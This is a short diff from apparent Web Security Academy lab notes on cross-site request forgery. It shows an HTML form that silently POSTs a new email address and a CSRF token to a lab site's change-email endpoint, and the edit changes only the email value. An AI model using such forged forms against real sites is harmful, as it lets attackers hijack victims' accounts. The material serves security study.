@@ -42,7 +42,7 @@ Cross-Site Request Forgery (CSRF)
 <html>
   <body>
     <form action="https://0a5100ac04b0e34880a217f9006900b6-ID.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="attacker@example.com">
+      <input type="hidden" name="email" value="xyz@gmail.com">
       <input type="hidden" name="csrf" value="aEQEB4p1zzAjQZ7v8GjpzPapyf6x8F1T">
     </form>
 
